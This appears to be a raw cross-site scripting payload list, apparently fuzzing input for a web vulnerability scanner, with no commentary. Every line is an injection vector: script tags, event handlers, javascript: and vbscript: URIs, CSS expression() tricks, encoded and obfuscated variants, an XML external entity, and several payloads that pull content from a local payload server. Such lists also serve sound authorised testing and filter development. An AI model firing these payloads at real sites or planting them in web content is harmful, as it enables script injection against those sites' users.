"><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
'><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
a="get";b="URL(\"";c="javascript:";d="alert(1);\")";eval(a+b+c+d);
<?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="X&lt;SCRIPT DEFER&gt;alert(&quot;X&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="X&lt;SCRIPT DEFER&gt;alert(&quot;X&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
'><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="X&lt;SCRIPT DEFER&gt;alert(&quot;X&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<xml src="javascript:alert(1);">
"><xml src="javascript:alert(1);">
'><xml src="javascript:alert(1);">
<xml id="X"><a><b><script>alert(1);</script>
"><script>alert(1);</script>
'><script>alert(1);</script>;</b></a></xml>
<div datafld="b" dataformatas="html" datasrc="#X"></div>
"><div datafld="b" dataformatas="html" datasrc="#X"></div>
'><div datafld="b" dataformatas="html" datasrc="#X"></div>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
"><XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
'><XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
%253cscript%253ealert(1)%253c/script%253e
foo\’; alert(1);//’;
[b][style="style=width:expre/**/ssion(alert(1))xt]bold[/style][/b]
[b][style="onmouseover="alert(1);]bold[/style][/b]
</script><script >alert(1)</script>
"></script><script >alert(1)</script>
'></script><script >alert(1)</script>
‘; alert(1); var foo=’
<img src="" onerror=alert(1)>
"><img src="" onerror=alert(1)>
'><img src="" onerror=alert(1)>
<img src="" onerror=alert(1);>
"><img src="" onerror=alert(1);>
'><img src="" onerror=alert(1);>
><img src="x:x" onerror=alert(1)>
s%22%20style=x:expression(alert(1))
s%22%20style=%22background:url(javascript:alert(’X’))
s%22%20%22+STYLE%3D%22background-image%3A+expression%28alert%28%27X%3F%29%29
%22/%3E%3Cmeta%20http-equiv=refresh%20content=0;javascript:alert(1);>
<IMG SRC="   javascript:alert(1);">
"><IMG SRC="   javascript:alert(1);">
'><IMG SRC="   javascript:alert(1);">
&lt;IMG SRC=" &amp;#14;  javascript:alert(1);"&gt;
&lt;SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(1)&gt;
&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;
&lt;IMG SRC="javascript:alert(1)"
&lt;iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html &lt;
&lt;SCRIPT&gt;a=/X/
alert(a.source)&lt;/SCRIPT&gt;
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(1);&lt;/SCRIPT&gt;
&lt;INPUT TYPE="IMAGE" SRC="javascript:alert(1);"&gt;
&lt;BODY BACKGROUND="javascript:alert(1)"&gt;
&lt;BODY ONLOAD=alert(1)&gt;
&lt;IMG LOWSRC="javascript:alert(1)"&gt;
&lt;BGSOUND SRC="javascript:alert(1);"&gt;
&lt;BR SIZE="&{alert(1)}"&gt;
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;X&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;X
&lt;IMG SRC='vbscript:msgbox(1)'&gt;
&lt;IMG SRC="mocha:[code]"&gt;
&lt;IMG SRC="livescript:[code]"&gt;
<img src='vbscript:do%63ument.lo%63ation="http://127.0.0.1:3555/xss_serve_payloads/X.html"'>
"><img src='vbscript:do%63ument.lo%63ation="http://127.0.0.1:3555/xss_serve_payloads/X.html"'>
'><img src='vbscript:do%63ument.lo%63ation="http://127.0.0.1:3555/xss_serve_payloads/X.html"'>
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);"&gt;
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="&gt;
&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);"&gt;
&lt;IFRAME SRC="javascript:alert(1);"&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert(1);"&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND="javascript:alert(1)"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert(1)"&gt;
&lt;DIV STYLE="background-image: url(javascript:alert(1))"&gt;
&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert(1))"&gt;
&lt;DIV STYLE="width: expression(alert(1));"&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert(1)';&lt;/STYLE&gt;
&lt;IMG STYLE="X:expr/*X*/ession(alert(1))"&gt;
&lt;X STYLE="X:expression(alert(1))"&gt;
exp/*&lt;A STYLE='no\X:noX("*//*");
&lt;STYLE TYPE="text/javascript"&gt;alert(1);&lt;/STYLE&gt;
&lt;STYLE&gt;.X{background-image:url("javascript:alert(1)");}&lt;/STYLE&gt;&lt;A CLASS=X&gt;&lt;/A&gt;
&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert(1)")}&lt;/STYLE&gt;
&lt;SCRIPT&gt;alert(1);&lt;/SCRIPT&gt;
&lt;BASE HREF="javascript:alert(1);//"&gt;
&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://127.0.0.1:3555/xss_serve_payloads/X.html"&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(1)&gt;&lt;/OBJECT&gt;
&lt;EMBED SRC="data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
a="get";&#10;b="URL(\"";&#10;c="javascript:";&#10;d="alert(1);\")";&#10;eval(a+b+c+d);
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&gt;&lt;![CDATA[cript:alert(1);"&gt;]]&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;XML ID=0&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC="javas&lt;!-- --&gt;cript:alert(1)"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
&lt;?import namespace="t" implementation="#default#time2"&gt;
&lt;t:set attributeName="innerHTML" to="X&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;X&amp;quot;)&amp;lt;/SCRIPT&amp;gt;"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;? echo('&lt;SCR)';
echo('IPT&gt;alert(1)&lt;/SCRIPT&gt;'); ?&gt;
&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert(1)&amp;lt;/SCRIPT&amp;gt;"&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;X&lt;/A&gt;
&lt;A HREF="http://1113982867/"&gt;X&lt;/A&gt;
&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;X&lt;/A&gt;
&lt;A HREF="http://0102.0146.0007.00000223/"&gt;X&lt;/A&gt;
&lt;A HREF="h&#x0A;tt&#09;p://6&amp;#9;6.000146.0x7.147/"&gt;X&lt;/A&gt;
&lt;A HREF="//127.0.0.1:3555/xss_serve_payloads/X.html"&gt;X&lt;/A&gt;
&lt;A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html"&gt;X&lt;/A&gt;
&lt;A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html./"&gt;X&lt;/A&gt;
&lt;A HREF="javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'"&gt;X&lt;/A&gt;
&lt;A HREF="http://www.keralacyberhttp://www.keralacyberforce.in/force.in/"&gt;X&lt;/A&gt;
<form id="test" /><button form="test" formaction="javascript:alert(1)">X
"><form id="test" /><button form="test" formaction="javascript:alert(1)">X
'><form id="test" /><button form="test" formaction="javascript:alert(1)">X
<input onblur=javascript:alert(1) autofocus><input autofocus>
"><input onblur=javascript:alert(1) autofocus><input autofocus>
'><input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>
"><video poster=javascript:alert(1)//></video>
'><video poster=javascript:alert(1)//></video>
"><video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>
"><video poster=javascript:alert(1)//></video>
'><video poster=javascript:alert(1)//></video>
'><video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>
"><video poster=javascript:alert(1)//></video>
'><video poster=javascript:alert(1)//></video>
<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>
"><head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>
'><head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
"><SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
'><SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
'><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<embed src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></embed>
"><embed src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></embed>
'><embed src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></embed>
<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
'><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
<b <script>alert(1)//</script>0</script></b>
"><b <script>alert(1)//</script>0</script></b>
'><b <script>alert(1)//</script>0</script></b>
<script src="javascript:alert(1)">
"><script src="javascript:alert(1)">
'><script src="javascript:alert(1)">
<image src="javascript:alert(1)">
"><image src="javascript:alert(1)">
'><image src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=alert(1)>x
"><div style=width:1px;filter:glow onfilterchange=alert(1)>x
'><div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
"><div style=width:1px;filter:glow onfilterchange=alert(1)>x
"><div style=width:1px;filter:glow onfilterchange=alert(1)>x
'><div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
'><div style=width:1px;filter:glow onfilterchange=alert(1)>x
"><div style=width:1px;filter:glow onfilterchange=alert(1)>x
'><div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
<? foo="><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>"> 
<! foo="><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>"> 
</ foo="><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>">
<% foo><x foo="%><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>">
<iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html></iframe>
"><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html></iframe>
'><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html></iframe>
<iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html></iframe>
"><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html></iframe>
'><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.gif!X.html></iframe>
<div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
"><div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
'><div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img[a][b]src=x[d]onerror[c]=[e]"alert(1)">
"><img[a][b]src=x[d]onerror[c]=[e]"alert(1)">
'><img[a][b]src=x[d]onerror[c]=[e]"alert(1)">
<a href="[a]java[b]script[c]:alert(1)">XXX</a>
"><a href="[a]java[b]script[c]:alert(1)">XXX</a>
'><a href="[a]java[b]script[c]:alert(1)">XXX</a>
<img src="x` `<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>"` `>
<img src onerror /" '"= alt=alert(1)//">
"><img src onerror /" '"= alt=alert(1)//">
'><img src onerror /" '"= alt=alert(1)//">
<title onpropertychange=alert(1)></title><title title=></title>
"><title onpropertychange=alert(1)></title><title title=></title>
'><title onpropertychange=alert(1)></title><title title=></title>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">
"><a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">
'><a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">
<!a foo=x=`y><img alt="`><img src=x:x onerror=alert(2)//"> 
"><!a foo=x=`y><img alt="`><img src=x:x onerror=alert(2)//"> 
'><!a foo=x=`y><img alt="`><img src=x:x onerror=alert(2)//"> 
<?a foo=x=`y><img alt="`><img src=x:x onerror=alert(3)//">
"><?a foo=x=`y><img alt="`><img src=x:x onerror=alert(3)//">
'><?a foo=x=`y><img alt="`><img src=x:x onerror=alert(3)//">
<!--[if]><script>alert(1)</script -->
"><!--[if]><script>alert(1)</script -->
'><!--[if]><script>alert(1)</script --> 
"><!--[if]><script>alert(1)</script --> 
'><!--[if]><script>alert(1)</script --> 
<!--[if<img src=x onerror=alert(2)//]> -->
"><!--[if<img src=x onerror=alert(2)//]> -->
'><!--[if<img src=x onerror=alert(2)//]> -->
<!-- `<img/src=xx:xx onerror=alert(1)//--!>
"><!-- `<img/src=xx:xx onerror=alert(1)//--!>
'><!-- `<img/src=xx:xx onerror=alert(1)//--!>
<xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%' </script> %>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>
"><xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%' </script> %>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>
'><xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'>  <script> x='<%' </script> %>/ alert(2) </script>  XXX <style> *['<!--']{} </style> -->{} *{color:red}</style>
<frameset onload=alert(1)>
"><frameset onload=alert(1)>
'><frameset onload=alert(1)>
<table background="javascript:alert(1)"></table>
"><table background="javascript:alert(1)"></table>
'><table background="javascript:alert(1)"></table>
<!--<img src="--><img src=x onerror=alert(1)//">
"><!--<img src="--><img src=x onerror=alert(1)//">
'><!--<img src="--><img src=x onerror=alert(1)//">
<comment><img src="</comment><img src=x onerror=alert(1))//">
"><comment><img src="</comment><img src=x onerror=alert(1))//">
'><comment><img src="</comment><img src=x onerror=alert(1))//">
<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>
"><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>
'><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>
<style><img src="</style><img src=x onerror=alert(1)//">
"><style><img src="</style><img src=x onerror=alert(1)//">
'><style><img src="</style><img src=x onerror=alert(1)//">
<li style=list-style:url() onerror=alert(1)></li> 
"><li style=list-style:url() onerror=alert(1)></li> 
'><li style=list-style:url() onerror=alert(1)></li> 
<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
"><a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
'><a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
"><style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
'><style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
"><link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
'><link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
<style>@import "data:,*%7bx:expression(write(1))%7D";</style>
"><style>@import "data:,*%7bx:expression(write(1))%7D";</style>
'><style>@import "data:,*%7bx:expression(write(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
'><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
<style>*[{}@import'test.css?]{color: green;}</style>X
"><style>*[{}@import'test.css?]{color: green;}</style>X
'><style>*[{}@import'test.css?]{color: green;}</style>X
* {-o-link:'javascript:alert(1)';-o-link-source: current;}
<div style="font-family:'foo[a];color:red;';">XXX</div>
"><div style="font-family:'foo[a];color:red;';">XXX</div>
'><div style="font-family:'foo[a];color:red;';">XXX</div>
<div style="font-family:foo}color=red;">X
"><div style="font-family:foo}color=red;">X
'><div style="font-family:foo}color=red;">XXX</div>
"><div style="font-family:foo}color=red;">X
"><div style="font-family:foo}color=red;">X
'><div style="font-family:foo}color=red;">XXX</div>
'><div style="font-family:foo}color=red;">X
"><div style="font-family:foo}color=red;">X
'><div style="font-family:foo}color=red;">XXX</div>
<div style="[a]color[b]:[c]red">XXX</div>
"><div style="[a]color[b]:[c]red">XXX</div>
'><div style="[a]color[b]:[c]red">XXX</div>
<div style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
"><div style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
'><div style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
<// style=x:expression\28write(1)\29>
"><// style=x:expression\28write(1)\29>
'><// style=x:expression\28write(1)\29>
<style>*{x:expression(write(1))}</style>
"><style>*{x:expression(write(1))}</style>
'><style>*{x:expression(write(1))}</style>
<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
'><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
"><div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
'><div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
<div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
"><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
'><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
'><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
<x style="background:url('x[a];color:red;/*')">XXX</x>
"><x style="background:url('x[a];color:red;/*')">XXX</x>
'><x style="background:url('x[a];color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
'><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
<script>({0:#0=alert/#0#/#0#(1)})</script>
"><script>({0:#0=alert/#0#/#0#(1)})</script>
'><script>({0:#0=alert/#0#/#0#(1)})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
'><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
'><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>
'><script>history.pushState(0,0,'/i/am/somewhere_else');</script>
<script src="#">{alert(1)}</script>;1
"><script src="#">{alert(1)}</script>;1
'><script src="#">{alert(1)}</script>;1
+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);
<b><script<b></b><alert(1)</script </b></b>
"><b><script<b></b><alert(1)</script </b></b>
'><b><script<b></b><alert(1)</script </b></b>
<script<{alert(1)}/></script </>
"><script<{alert(1)}/></script </>
'><script<{alert(1)}/></script </>
0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
'><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
'><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg
"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg
'><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script></svg>
<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
"><svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
'><svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
'><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
<svg><style>&lt;img/src=x onerror=alert(1)// </b>
"><svg><style>&lt;img/src=x onerror=alert(1)// </b>
'><svg><style>&lt;img/src=x onerror=alert(1)// </b>
<?xml-stylesheet href="javascript:alert(1)"?><root/>
"><?xml-stylesheet href="javascript:alert(1)"?><root/>
'><?xml-stylesheet href="javascript:alert(1)"?><root/>
<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
'><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
<!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.html">]><y>&x;</y>
"><!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.html">]><y>&x;</y>
'><!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.html">]><y>&x;</y>
<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
'><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
'><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
